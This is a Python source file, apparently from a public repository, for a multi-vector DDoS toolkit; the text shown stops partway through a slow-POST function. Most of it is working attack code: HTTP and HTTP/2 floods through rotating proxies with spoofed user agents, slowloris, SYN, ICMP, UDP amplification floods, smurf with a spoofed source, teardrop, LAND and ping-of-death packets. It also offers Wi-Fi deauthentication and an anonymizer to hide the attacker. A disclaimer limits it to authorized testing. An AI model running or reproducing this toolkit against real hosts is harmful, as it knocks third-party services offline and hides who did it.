#!/usr/bin/env python3
# -*- coding: utf-8 -*-
### BEGIN INIT INFO
# Provides:          ddos_toolkit
# Required-Start:    $network $remote_fs $syslog
# Required-Stop:     $remote_fs $syslog
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: Advanced DDoS Attack Toolkit
# Description:       Comprehensive toolkit for simulating various DDoS attacks for ethical cybersecurity testing, penetration testing, and network resilience evaluation. Includes 20+ attack vectors, proxy support, performance monitoring, and detailed reporting.
# Author:            
# + LIONMAD <https://github.com/Midohajhouj>
# Version:           v1.0
# License:           MIT License - https://opensource.org/licenses/MIT
# Dependencies:      python3 (>=3.7), aiohttp, scapy, dnspython, colorama, tqdm, psutil.
# Support:           https://github.com/Midohajhouj/DDoS-Toolkit/issues
# Security:          Requires root privileges for certain attacks
# Disclaimer:        For authorized testing only. Use responsibly.
#### END INIT INFO ####

import sys # Install module with pip sys --break-system-packages
import importlib # Install module with pip importlib --break-system-packages

def check_library(lib_name):
    """Checks if a library is installed and prompts to install it if not."""
    try:
        importlib.import_module(lib_name)
    except ImportError:
        print(f"{lib_name} is not installed.")
        print(f"Install it using: pip install {lib_name} --break-system-packages")
        sys.exit(1)
        
# ================== Third-Party Libraries ==================
# Check for third-party libraries.
required_libraries = [
    "aiohttp", "asyncio", "argparse", "scapy.all", "dns.resolver",
    "colorama", "tqdm", "requests", "tabulate"
]

for lib in required_libraries:
    # Handle libraries with dot notation like 'scapy.all'
    check_library(lib.split(".")[0])

# Libraries are now guaranteed to be installed. Import them.
import aiohttp  # Install module with pip aiohttp --break-system-packages
import asyncio  # Install module with pip asyncio --break-system-packages
import time  # Install module with pip time --break-system-packages
import argparse  # Install module with pip argparse --break-system-packages
import threading  # Install module with pip threading --break-system-packages
from concurrent.futures import ThreadPoolExecutor, as_completed  # Install module with pip concurrent.futures --break-system-packages
import random  # Install module with pip random --break-system-packages
import json  # Install module with pip json --break-system-packages
from itertools import cycle  # Install module with pip itertools --break-system-packages
from collections import deque  # Install module with pip collections --break-system-packages
from uuid import uuid4  # Install module with pip uuid --break-system-packages
from base64 import b64encode  # Install module with pip base64 --break-system-packages
import hashlib  # Install module with pip hashlib --break-system-packages
import zlib  # Install module with pip zlib --break-system-packages
import hmac  # Install module with pip hmac --break-system-packages
import signal  # Install module with pip signal --break-system-packages
import sys  # Install module with pip sys --break-system-packages
import os  # Install module with pip os --break-system-packages
import subprocess  # Install module with pip subprocess --break-system-packages
import socket  # Install module with pip socket --break-system-packages
import struct  # Install module with pip struct --break-system-packages
import logging  # Install module with pip logging --break-system-packages
import psutil  # Install module with pip psutil --break-system-packages
import shutil  # Install module with pip shutil --break-system-packages
import scapy.all as scapy  # Install module with pip scapy --break-system-packages
import dns.resolver  # Install module with pip dnspython --break-system-packages
from colorama import init, Fore, Style  # Install module with pip colorama --break-system-packages
from tqdm import tqdm  # Install module with pip tqdm --break-system-packages
from typing import Optional # Install module with pip typing --break-system-packages

# Initialize colorama for colorized terminal output
init(autoreset=True)
# Colors
RED = Fore.RED
GREEN = Fore.GREEN
YELLOW = Fore.YELLOW
BLUE = Fore.BLUE
CYAN = Fore.CYAN
MAGENTA = Fore.MAGENTA
RESET = Style.RESET_ALL

# Global variables
requests_sent = 0
successful_requests = 0
failed_requests = 0
last_time = time.time()
requests_lock = threading.Lock()
rps_history = deque(maxlen=60)
stop_event = threading.Event()

# User-Agent list
# Comprehensive User-Agent list with device information
USER_AGENTS = [
    # Windows 10/11 PCs - Chrome
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    # Windows 10/11 PCs - Edge
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 Edge/94.0.992.31",
    # macOS Devices - Safari
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    # Linux PCs - Chrome
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    # Android Devices - Chrome
    "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36",
    # iOS Devices - Safari
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    # Legacy Windows - Firefox
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
    "Mozilla/5.0 (Windows NT 5.1; rv:40.0) Gecko/20100101 Firefox/40.0",
    # Legacy Android - Chrome
    "Mozilla/5.0 (Linux; Android 4.4.4; Nexus 5 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.109 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 4.2.2; Nexus 4 Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.159 Mobile Safari/537.36",
    # Internet Explorer
    "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; AS; AS-KDG) like Gecko",
    # Smart TVs and Game Consoles
    "Mozilla/5.0 (SMART-TV; Linux; Tizen 5.5) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.0 Chrome/69.0.3497.106 TV Safari/537.36",
    "Mozilla/5.0 (PlayStation 4 8.52) AppleWebKit/605.1.15 (KHTML, like Gecko)",
    # Bots and Crawlers
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)"
]

# Supported HTTP methods
HTTP_METHODS = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS", "TRACE", "CONNECT"]

# Configure logging
logging.basicConfig(
    level=logging.INFO,  # Logging level
    format='%(asctime)s - %(levelname)s - %(message)s',  # Log format
    handlers=[logging.StreamHandler()]  # Output to console
)
logger = logging.getLogger(__name__)  # Module-level logger

def display_banner():
    print(f"""
{BLUE}
███████████████████████████████████████████████████████████████████████████████████████████████████                                     
 ▄▄▄▄▄    ▄▄▄▄▄      ▄▄▄▄     ▄▄▄▄     ▄▄▄▄▄▄▄▄   ▄▄▄▄     ▄▄▄▄   ▄▄      ▄▄   ▄▄▄ ▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄         
 ██▀▀▀██  ██▀▀▀██   ██▀▀██  ▄█▀▀▀▀█    ▀▀▀██▀▀▀  ██▀▀██   ██▀▀██  ██      ██  ██▀  ▀▀██▀▀ ▀▀▀██▀▀▀ 
 ██    ██ ██    ██ ██    ██ ██▄           ██    ██    ██ ██    ██ ██      ██▄██      ██      ██    
 ██    ██ ██    ██ ██    ██  ▀████▄       ██    ██    ██ ██    ██ ██      █████      ██      ██    
 ██    ██ ██    ██ ██    ██      ▀██      ██    ██    ██ ██    ██ ██      ██  ██▄    ██      ██    
 ██▄▄▄██  ██▄▄▄██   ██▄▄██  █▄▄▄▄▄█▀      ██     ██▄▄██   ██▄▄██  ██▄▄▄▄▄ ██   ██▄ ▄▄██▄▄    ██         
 ▀▀▀▀▀    ▀▀▀▀▀      ▀▀▀▀    ▀▀▀▀▀        ▀▀      ▀▀▀▀     ▀▀▀▀   ▀▀▀▀▀▀▀ ▀▀    ▀▀ ▀▀▀▀▀▀    ▀▀    
|U|S|E| |T|H|E| |T|O|O|L|  |A|T| |Y|O|U|R| |O|W|N| |R|I|S|K|  |L|I|O|N|M|A|D|  |S|A|L|U|T|  |Y|O|U|                                                                                        
███████████████████████████████████████████████████████████████████████████████████████████████████
{RESET}
""")

def display_help():
    print(f"""
{YELLOW}╔═════════════════════════════════════════════════════════════╗
{YELLOW}║ {BLUE}DDoS Toolkit by LIONMAD   -   Comprehensive help information{YELLOW}║
{YELLOW}╚═════════════════════════════════════════════════════════════╝
{RESET}
{CYAN}For more info, visit our website: https://ddostoolkit.vercel.app/ [OPTIONS]{RESET}
{BLUE}Usage: ddos [OPTIONS]{RESET}
  {GREEN}-u, --url URL{RESET}              Target URL or IP address (required for most attacks)
  {GREEN}-a, --attack-mode MODE{RESET}     Type of attack to perform (see below)
  {GREEN}-t, --threads NUM{RESET}          Number of threads/workers (default: 10)
  {GREEN}-d, --duration SEC{RESET}         Attack duration in seconds (default: 60)
  {GREEN}-r, --rate-limit RPS{RESET}       Rate limit per thread (default: 100)
  {GREEN}-p, --pause SEC{RESET}            Delay between requests (default: 0.1)
  {GREEN}--proxies FILE{RESET}             File containing proxy list (one per line)
  {GREEN}--results FILE{RESET}             Save attack results to JSON file
  {GREEN}-v, --version{RESET}              Show version information and exit FILE
  {GREEN}-s, --scan{RESET}                 Perform network scan before attack
  {GREEN}--anonymizer [start|stop]{RESET}  Enable/disable anonymizer for attack
  {GREEN}--wifi-deauth{RESET}              Perform Wi-Fi deauthentication attack
  {GREEN}-i, --interactive{RESET}          Start interactive command-line interface

{YELLOW}Attack Modes:{RESET}
  {CYAN}http-flood{RESET}               {CYAN}slowloris{RESET}
  {CYAN}udp-flood{RESET}                {CYAN}syn-flood{RESET} 
  {CYAN}icmp-flood{RESET}               {CYAN}dns-amplification{RESET} 
  {CYAN}ntp-amplification{RESET}        {CYAN}memcached-amplification{RESET}
  {CYAN}smurf{RESET}                    {CYAN}teardrop{RESET} 
  {CYAN}http2-flood{RESET}              {CYAN}goldeneye{RESET}             
  {CYAN}slow-read{RESET}                {CYAN}zero-byte{RESET}              
  {CYAN}random-packets{RESET}           {CYAN}ssl-flood{RESET}              
  {CYAN}land-attack{RESET}              {CYAN}ping-of-death{RESET}          
  {CYAN}slow-post{RESET}                {CYAN}xml-bomb{RESET}              
  {CYAN}ntlm-auth-flood{RESET}          {CYAN}char-gen{RESET}                
  {CYAN}rst-flood{RESET}                {CYAN}ack-flood{RESET}             
  {CYAN}http-fragmentation{RESET}       {CYAN}ws-dos{RESET}                 
  {CYAN}quic-flood{RESET}               {CYAN}slow-flood{RESET}             
  {CYAN}ftp-flood{RESET}                {CYAN}ssh-flood{RESET}
  
  {YELLOW}Warning:{RESET} {RED}This tool should only be used for authorized security testing.{RESET}
""")

def parse_args():
    parser = argparse.ArgumentParser(
        description=f"{YELLOW}Advanced DDoS Toolkit v1.0{RESET}",
        formatter_class=argparse.RawTextHelpFormatter,
        add_help=False
    )
    
    # Core attack options
    core_group = parser.add_argument_group(f"{CYAN}Core Options{RESET}")
    core_group.add_argument("-u", "--url", help="Target URL or IP address")
    core_group.add_argument("-a", "--attack-mode", 
                          choices=["http-flood", "slowloris", "udp-flood", "syn-flood", 
                                  "icmp-flood", "dns-amplification", "ftp-flood", 
                                  "ssh-flood", "ntp-amplification", "memcached-amplification", 
                                  "smurf", "teardrop", "http2-flood", "goldeneye", 
                                  "slow-read", "zero-byte", "random-packets", "ssl-flood",
                                  "land-attack", "ping-of-death", "slow-post", "xml-bomb",
                                  "ntlm-auth-flood", "char-gen", "rst-flood", "ack-flood",
                                  "http-fragmentation", "ws-dos", "quic-flood"],
                          default="http-flood",
                          help="Type of attack to perform")
    core_group.add_argument("-t", "--threads", type=int, default=10,
                          help="Number of threads/workers")
    core_group.add_argument("-r", "--rate-limit", type=int, default=100,
                          help="Rate limit per thread (requests per second)")
    core_group.add_argument("-p", "--pause", type=float, default=0.1,
                          help="Pause time between requests")
    core_group.add_argument("-d", "--duration", type=int, default=1500,
                          help="Attack duration in seconds")
    core_group.add_argument("--proxies", help="File containing proxy list")
    core_group.add_argument("--results", help="File to save results (JSON)")

    # Additional features
    feature_group = parser.add_argument_group(f"{MAGENTA}Additional Features{RESET}")
    feature_group.add_argument("-s", "--scan", action="store_true",
                             help="Perform network scan before attack")
    feature_group.add_argument("--wifi-deauth", action="store_true",
                             help="Perform Wi-Fi deauthentication attack")
    feature_group.add_argument("--anonymizer", choices=["start", "stop"],
                             help="Enable/disable anonymizer")
    feature_group.add_argument("-i", "--interactive", action="store_true",
                             help="Start interactive CLI")

    # Information options
    info_group = parser.add_argument_group(f"{GREEN}Information{RESET}")
    info_group.add_argument("-h", "--help", action="store_true",
                          help="Show this help message and exit")
    info_group.add_argument("-v", "--version", action="store_true",
                          help="Show version information and exit")

    return parser.parse_args()

def load_proxies(proxy_file: str):
    """Load proxies from a text file."""
    try:
        with open(proxy_file, "r") as f:
            proxy_list = f.read().splitlines()
        valid_proxies = [p.strip() for p in proxy_list if p.strip()]
        print(f"Loaded {len(valid_proxies)} proxies.")
        return valid_proxies
    except FileNotFoundError:
        print(f"Proxy file '{proxy_file}' not found.")
        return []

def validate_proxies(proxies):
    """Validate proxy servers using multithreading."""
    validated_proxies = []
    with ThreadPoolExecutor(max_workers=10) as executor:
        future_to_proxy = {executor.submit(check_proxy, proxy): proxy for proxy in proxies}
        for future in as_completed(future_to_proxy):
            proxy = future_to_proxy[future]
            try:
                if future.result():
                    validated_proxies.append(proxy)
            except Exception as e:
                logging.error(f"Proxy validation failed for {proxy}: {e}")
    print(f"Validated {len(validated_proxies)} proxies.")
    return validated_proxies

async def check_proxy(proxy: str):
    """Check if a proxy server is working."""
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get("https://httpbin.org/ip", proxy=proxy, timeout=3) as response:
                return response.status == 200
    except Exception:
        return False

async def check_proxy_health(proxy: str):
    """Check the health of a proxy server."""
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get("https://httpbin.org/ip", proxy=proxy, timeout=3) as response:
                return response.status == 200
    except Exception:
        return False

async def monitor_proxy_health(proxies):
    """Continuously monitor proxy health and remove dead proxies."""
    while not stop_event.is_set():
        for proxy in proxies:
            if not await check_proxy_health(proxy):
                proxies.remove(proxy)
                print(f"Removed unhealthy proxy: {proxy}")
        await asyncio.sleep(60)

def generate_payload(payload_type: str, secret_key: Optional[bytes] = None) -> Optional[bytes]:
    """Generate various types of attack payloads."""
    if secret_key is None:
        secret_key = os.getenv("SECRET_KEY", b"your_default_secret_key")
    
    try:
        payload_id = str(uuid4())
        data = b64encode(os.urandom(64)).decode()
        
        payload = {"id": payload_id, "data": data}
        
        payload_str = json.dumps(payload, separators=(',', ':'))
        signature = hmac.new(secret_key, payload_str.encode(), hashlib.sha256).hexdigest()
        payload["signature"] = signature
        
        logger.debug(f"Generated signature: {signature}")

        if payload_type == "json":
            compressed_payload = compress_payload(json.dumps(payload).encode())
        elif payload_type == "xml":
            xml_payload = f"<data><id>{payload_id}</id><value>{data}</value><signature>{signature}</signature></data>"
            compressed_payload = compress_payload(xml_payload.encode(), compression_type="gzip")
        elif payload_type == "form":
            return json.dumps(payload).encode()
        else:
            logger.error(f"Invalid payload type: {payload_type}")
            return None
        
        return compressed_payload
    except Exception as e:
        logger.error(f"Error generating payload: {e}")
        return None

def compress_payload(data: bytes, compression_type: str = "zlib") -> bytes:
    """Compress payload data using specified algorithm."""
    try:
        if compression_type == "gzip":
            compressed_data = gzip.compress(data)
            logger.debug(f"Compressed using gzip: {len(compressed_data)} bytes")
        else:
            compressed_data = zlib.compress(data)
            logger.debug(f"Compressed using zlib: {len(compressed_data)} bytes")
        
        return compressed_data
    except Exception as e:
        logger.error(f"Error compressing data: {e}")
        return data

def wifi_deauth(mode):
    """Perform Wi-Fi deauthentication attack."""
    try:
        wifideauth_path = "/opt/DDoS-Toolkit/assets/wifideauth"
        
        if not os.path.isfile(wifideauth_path):
            print(f"{RED}[!] netscan not found in /opt/DDoS-Toolkit/assets/ ...... Aborting.{RESET}")
            return

        if not shutil.which("python3"):
            print(f"{RED}[!] Python3 is not installed or not in PATH. Please install it to proceed.{RESET}")
            return

        command = ["python3", wifideauth_path, "wlan0"]

        print(f"{BLUE}[*] Starting network scan on wlan0..{RESET}")
        subprocess.run(command, check=True)

        print(f"{GREEN}[+] Network scan on {target_ip} completed successfully.{RESET}")
    except subprocess.CalledProcessError as cpe:
        print(f"{RED}[!] Error during network scan: {cpe}.{RESET}")
    except FileNotFoundError as fnf:
        print(f"{RED}[!] Required file or command not found: {fnf}.{RESET}")
    except Exception as e:
        print(f"{RED}[!] An unexpected error occurred: {e}.{RESET}")
        
def run_network_scanner(target_ip):
    """Run network scanning tool against target IP."""
    try:
        netscan_path = "/opt/DDoS-Toolkit/assets/netscan"
        
        if not os.path.isfile(netscan_path):
            print(f"{RED}[!] netscan not found in /opt/DDoS-Toolkit/assets/ ...... Aborting.{RESET}")
            return

        if not shutil.which("python3"):
            print(f"{RED}[!] Python3 is not installed or not in PATH. Please install it to proceed.{RESET}")
            return

        command = ["python3", netscan_path, "-t", target_ip]

        print(f"{BLUE}[*] Starting network scan on {target_ip}...{RESET}")
        subprocess.run(command, check=True)

        print(f"{GREEN}[+] Network scan on {target_ip} completed successfully.{RESET}")

    except subprocess.CalledProcessError as cpe:
        print(f"{RED}[!] Error during network scan: {cpe}.{RESET}")
    except FileNotFoundError as fnf:
        print(f"{RED}[!] Required file or command not found: {fnf}.{RESET}")
    except Exception as e:
        print(f"{RED}[!] An unexpected error occurred: {e}.{RESET}")

def run_anonymizer(mode):
    """Run anonymizer script to mask network traffic."""
    try:
        anonymizer_path = "/opt/DDoS-Toolkit/assets/anonymizer"
        
        if not os.path.isfile(anonymizer_path):
            print(f"{RED}[ERROR] anonymizer script not found in {anonymizer_path}. Aborting.{RESET}")
            sys.exit(1)
        
        if mode not in ["start", "stop"]:
            print(f"{YELLOW}[WARNING] Invalid mode '{mode}' specified. Please use 'start' or 'stop'.{RESET}")
            sys.exit(1)
        
        command = ["bash", anonymizer_path, mode]
        
        action_message = "Starting" if mode == "start" else "Stopping"
        print(f"{BLUE}[INFO] {action_message} anonymizer...{RESET}")
        
        result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        
        if result.returncode == 0:
            print(f"{GREEN}[SUCCESS] anonymizer {mode} completed successfully!{RESET}")
        else:
            print(f"{RED}[ERROR] anonymizer {mode} failed with return code {result.returncode}.{RESET}")
            print(f"{RED}[DETAILS] {result.stderr.strip()}{RESET}")
            sys.exit(1)
    
    except FileNotFoundError:
        print(f"{RED}[ERROR] 'bash' not found. Ensure bash is installed and available in PATH.{RESET}")
        sys.exit(1)
    
    except subprocess.SubprocessError as e:
        print(f"{RED}[ERROR] Subprocess error occurred: {e}{RESET}")
        sys.exit(1)
    
    except Exception as e:
        print(f"{RED}[ERROR] An unexpected error occurred: {e}.{RESET}")
        sys.exit(1)
    
    finally:
        print(f"{BLUE}[INFO] Exiting anonymizer handler.{RESET}")
        sys.exit(0)

async def resolve_target(target_url: str):
    """Resolve domain name to IP address."""
    try:
        domain_or_ip = target_url.split("//")[-1].split("/")[0]
        if is_valid_ip(domain_or_ip):
            print(f"Target is an IP address: {domain_or_ip}")
            return domain_or_ip
        resolver = dns.resolver.Resolver()
        ip = resolver.resolve(domain_or_ip, "A")[0].to_text()
        print(f"Resolved {domain_or_ip} to IP: {ip}")
        return ip
    except Exception as e:
        logging.error(f"Failed to resolve domain: {e}")
        return None

def is_valid_ip(ip: str):
    """Check if string is a valid IP address."""
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False

async def rate_limited_attack(target_url, stop_event, pause_time, rate_limit, proxies=None, headers=None, payload_type="json", retry=3):
    """Perform rate-limited HTTP flood attack."""
    global requests_sent, successful_requests, failed_requests, last_time
    proxy_pool = cycle(proxies) if proxies else None
    semaphore = asyncio.Semaphore(rate_limit)

    if not target_url.startswith(("http://", "https://")):
        target_url = f"http://{target_url}"

    async with aiohttp.ClientSession() as session:
        while not stop_event.is_set():
            async with semaphore:
                for attempt in range(retry):
                    try:
                        headers = headers or {"User-Agent": random.choice(USER_AGENTS)}
                        method = random.choice(HTTP_METHODS)
                        payload = generate_payload(payload_type) if method in ["POST", "PUT", "PATCH"] else None

                        proxy = next(proxy_pool) if proxy_pool else None
                        async with session.request(
                            method, target_url, headers=headers, proxy=proxy, data=payload, timeout=aiohttp.ClientTimeout(total=5)
                        ) as response:
                            with requests_lock:
                                requests_sent += 1
                                if response.status in [200, 201, 204]:
                                    successful_requests += 1
                                else:
                                    failed_requests += 1
                        break
                    except aiohttp.ClientError as e:
                        with requests_lock:
                            failed_requests += 1
                        logging.error(f"Client error during request (attempt {attempt + 1}): {e}")
                        await asyncio.sleep(2 ** attempt)
                    except Exception as e:
                        with requests_lock:
                            failed_requests += 1
                        logging.error(f"Unexpected error during request (attempt {attempt + 1}): {e}")
                        await asyncio.sleep(2 ** attempt)
                await asyncio.sleep(pause_time)

async def slowloris_attack(target_url, stop_event, pause_time, rate_limit, proxies=None, headers=None, retry=3):
    """Perform Slowloris attack (partial HTTP requests)."""
    global requests_sent, successful_requests, failed_requests
    proxy_pool = cycle(proxies) if proxies else None
    semaphore = asyncio.Semaphore(rate_limit)

    if not target_url.startswith(("http://", "https://")):
        target_url = f"http://{target_url}"

    async with aiohttp.ClientSession() as session:
        while not stop_event.is_set():
            async with semaphore:
                for attempt in range(retry):
                    try:
                        headers = headers or {"User-Agent": random.choice(USER_AGENTS)}
                        async with session.get(target_url, headers=headers, proxy=next(proxy_pool) if proxy_pool else None) as response:
                            with requests_lock:
                                requests_sent += 1
                                if response.status in [200, 201, 204]:
                                    successful_requests += 1
                                else:
                                    failed_requests += 1
                        await asyncio.sleep(pause_time)
                        break
                    except aiohttp.ClientError as e:
                        with requests_lock:
                            failed_requests += 1
                        logging.error(f"Client error during request (attempt {attempt + 1}): {e}")
                    except Exception as e:
                        with requests_lock:
                            failed_requests += 1
                        logging.error(f"Unexpected error during request (attempt {attempt + 1}): {e}")
                await asyncio.sleep(pause_time)

def syn_flood(target_ip, target_port, duration):
    """Perform SYN flood attack."""
    print(f"Starting SYN flood attack on {target_ip}:{target_port} for {duration} seconds...")
    start_time = time.time()
    while time.time() - start_time < duration:
        try:
            ip_layer = scapy.IP(dst=target_ip)
            tcp_layer = scapy.TCP(sport=random.randint(1024, 65535), dport=target_port, flags="S")
            packet = ip_layer / tcp_layer
            scapy.send(packet, verbose=False)
        except Exception as e:
            print(f"Error during SYN flood: {e}")
        time.sleep(0.01)
    print("SYN flood attack completed.")

def icmp_flood(target_ip, duration):
    """Perform ICMP ping flood attack."""
    print(f"Starting ICMP flood attack on {target_ip} for {duration} seconds...")
    start_time = time.time()
    while time.time() - start_time < duration:
        try:
            packet = scapy.IP(dst=target_ip) / scapy.ICMP()
            scapy.send(packet, verbose=False)
        except Exception as e:
            print(f"Error during ICMP flood: {e}")
        time.sleep(0.01)
    print("ICMP flood attack completed.")

async def dns_amplification(target_ip, duration):
    """Perform DNS amplification attack."""
    print(f"Starting DNS amplification attack on {target_ip} for {duration} seconds...")
    start_time = time.time()
    while time.time() - start_time < duration:
        try:
            packet = scapy.IP(dst=target_ip) / scapy.UDP(dport=53) / scapy.DNS(rd=1, qd=scapy.DNSQR(qname="example.com"))
            scapy.send(packet, verbose=False)
        except Exception as e:
            print(f"Error during DNS amplification: {e}")
        time.sleep(0.01)
    print("DNS amplification attack completed.")

def ftp_flood(target_ip, target_port, duration):
    """Perform an FTP flood attack with improved connection management and payload variation."""
    print(f"Starting FTP flood attack on {target_ip}:{target_port} for {duration} seconds...")
    start_time = time.time()
    while time.time() - start_time < duration:
        try:
            # Create a socket and connect to the target FTP server
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target_ip, target_port))
            # Send a random payload
            sock.send(os.urandom(random.randint(512, 1024)))
            sock.close()
        except Exception as e:
            print(f"Error during FTP flood: {e}")
        time.sleep(0.01)  # Adjust the sleep time to control the attack rate
    print("FTP flood attack completed.")


def ssh_flood(target_ip, target_port, duration):
    """Perform an SSH flood attack with improved connection management and payload variation."""
    print(f"Starting SSH flood attack on {target_ip}:{target_port} for {duration} seconds...")
    start_time = time.time()
    while time.time() - start_time < duration:
        try:
            # Create a socket and connect to the target SSH server
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target_ip, target_port))
            # Send a random payload
            sock.send(os.urandom(random.randint(512, 1024)))
            sock.close()
        except Exception as e:
            print(f"Error during SSH flood: {e}")
        time.sleep(0.01)  # Adjust the sleep time to control the attack rate
    print("SSH flood attack completed.")
    
def ntp_amplification(target_ip, duration):
    """Perform NTP amplification attack."""
    print(f"Starting NTP amplification attack on {target_ip} for {duration} seconds...")
    start_time = time.time()
    while time.time() - start_time < duration:
        try:
            packet = scapy.IP(dst=target_ip) / scapy.UDP(dport=123) / scapy.Raw(load=os.urandom(64))
            scapy.send(packet, verbose=False)
        except Exception as e:
            print(f"Error during NTP amplification: {e}")
        time.sleep(0.01)
    print("NTP amplification attack completed.")

def memcached_amplification(target_ip, duration):
    """Perform Memcached amplification attack."""
    print(f"Starting Memcached amplification attack on {target_ip} for {duration} seconds...")
    start_time = time.time()
    while time.time() - start_time < duration:
        try:
            packet = scapy.IP(dst=target_ip) / scapy.UDP(dport=11211) / scapy.Raw(load=os.urandom(64))
            scapy.send(packet, verbose=False)
        except Exception as e:
            print(f"Error during Memcached amplification: {e}")
        time.sleep(0.01)
    print("Memcached amplification attack completed.")

def smurf_attack(target_ip, duration):
    """Perform Smurf attack."""
    print(f"Starting Smurf attack on {target_ip} for {duration} seconds...")
    start_time = time.time()
    while time.time() - start_time < duration:
        try:
            packet = scapy.IP(src=target_ip, dst="255.255.255.255") / scapy.ICMP()
            scapy.send(packet, verbose=False)
        except Exception as e:
            print(f"Error during Smurf attack: {e}")
        time.sleep(0.01)
    print("Smurf attack completed.")

def teardrop_attack(target_ip, duration):
    """Perform Teardrop attack."""
    print(f"Starting Teardrop attack on {target_ip} for {duration} seconds...")
    start_time = time.time()
    while time.time() - start_time < duration:
        try:
            packet = scapy.IP(dst=target_ip, flags="MF", frag=0) / scapy.UDP() / ("X" * 64)
            packet2 = scapy.IP(dst=target_ip, flags=0, frag=1) / ("X" * 64)
            scapy.send(packet, verbose=False)
            scapy.send(packet2, verbose=False)
        except Exception as e:
            print(f"Error during Teardrop attack: {e}")
        time.sleep(0.01)
    print("Teardrop attack completed.")

async def http2_flood(target_url, stop_event, pause_time, rate_limit, proxies=None, headers=None, payload_type="json", retry=3):
    """Perform HTTP/2 flood attack."""
    global requests_sent, successful_requests, failed_requests, last_time
    proxy_pool = cycle(proxies) if proxies else None
    semaphore = asyncio.Semaphore(rate_limit)

    if not target_url.startswith(("http://", "https://")):
        target_url = f"https://{target_url}"

    async with aiohttp.ClientSession() as session:
        while not stop_event.is_set():
            async with semaphore:
                for attempt in range(retry):
                    try:
                        headers = headers or {"User-Agent": random.choice(USER_AGENTS)}
                        method = random.choice(HTTP_METHODS)
                        payload = generate_payload(payload_type) if method in ["POST", "PUT", "PATCH"] else None

                        proxy = next(proxy_pool) if proxy_pool else None
                        async with session.request(
                            method, target_url, headers=headers, proxy=proxy, data=payload
                        ) as response:
                            with requests_lock:
                                requests_sent += 1
                                if response.status in [200, 201, 204]:
                                    successful_requests += 1
                                else:
                                    failed_requests += 1
                        break
                    except aiohttp.ClientError as e:
                        with requests_lock:
                            failed_requests += 1
                        logging.error(f"Client error during request (attempt {attempt + 1}): {e}")
                    except Exception as e:
                        with requests_lock:
                            failed_requests += 1
                        logging.error(f"Unexpected error during request (attempt {attempt + 1}): {e}")
                await asyncio.sleep(pause_time)

def land_attack(target_ip, target_port, duration):
    """LAND attack (send packets with source=dest)."""
    print(f"Starting LAND attack on {target_ip}:{target_port} for {duration} seconds...")
    start_time = time.time()
    while time.time() - start_time < duration and not stop_event.is_set():
        try:
            packet = scapy.IP(src=target_ip, dst=target_ip) / \
                     scapy.TCP(sport=target_port, dport=target_port, flags="S")
            scapy.send(packet, verbose=False)
        except Exception as e:
            logger.error(f"Error during LAND attack: {e}")
        time.sleep(0.01)
    print("LAND attack completed.")

def ping_of_death(target_ip, duration):
    """Ping of Death attack with oversized packets."""
    print(f"Starting Ping of Death attack on {target_ip} for {duration} seconds...")
    start_time = time.time()
    while time.time() - start_time < duration and not stop_event.is_set():
        try:
            packet = scapy.IP(dst=target_ip, flags="MF", frag=0) / \
                     scapy.ICMP() / \
                     ("X" * 65500)
            scapy.send(packet, verbose=False)
        except Exception as e:
            logger.error(f"Error during Ping of Death: {e}")
        time.sleep(0.1)
    print("Ping of Death attack completed.")

async def slow_post_attack(target_url, stop_event, pause_time, rate_limit, proxies=None):
    """Slow POST attack with chunked transfer encoding."""
    global requests_sent, successful_requests, failed_requests
    proxy_pool = cycle(proxies) if proxies else None
    semaphore = asyncio.Semaphore(rate_limit)

    if not target_url.startswith(("http://", "https://")):
        target_url = f"http://{target_url}"

    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Content-Type": "application/x-www-form-urlencoded",
        "Transfer-Encoding": "chunked"
    }

    async def generate_chunked_data():
        yield b"1\r\na\r\n"
        await asyncio.sleep(10)
        yield b"1\r\nb\r\n"
        await asyncio.sleep(10)
        yield b"0\r\n\r\n"

    async with aiohttp.ClientSession() as session:
        while not stop_event.is_set():
            async with semaphore:
                try:
                    proxy = next(proxy_pool) if proxy_pool else None
                    async with session.post(
                        target_url,
                        headers=headers,
                        proxy=proxy,
                        data=generate_chunked_data(),
                        timeout=aiohttp.ClientTimeout(total=30)
                    ) as response:
                        with requests_lock:
